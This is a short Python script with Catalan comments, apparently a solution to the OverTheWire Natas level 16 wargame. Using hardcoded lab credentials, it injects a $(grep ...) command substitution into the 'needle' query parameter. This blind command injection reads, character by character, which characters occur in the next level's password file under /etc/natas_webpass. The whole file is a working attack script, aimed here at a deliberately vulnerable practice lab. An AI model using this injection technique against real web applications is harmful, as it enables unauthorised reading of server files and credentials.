import requests,string

# Configuració de la URL i credencials
url = "http://natas16.natas.labs.overthewire.org/"
username = "natas16"
password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
# Generació de caràcters per a la cerca
characters = ''.join([string.digits,string.ascii_letters])
# Llista per emmagatzemar els caràcters trobats
Passchar = []
# Cadena que indica que l'usuari existeix
userExists = "Africans"

for i in characters:
    # Construcció de la sol·licitud HTTP, utilitzant la comanda 'grep' per cercar el caràcter a l'arxiu de contrasenyes
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=Africans$(grep ' + i + ' /etc/natas_webpass/natas17)', auth=(username,password))
    # Verificació de si l'usuari existeix (depèn de la resposta)
    if not userExists in r.text:
        Passchar.append(i)
        print(i)

print(Passchar)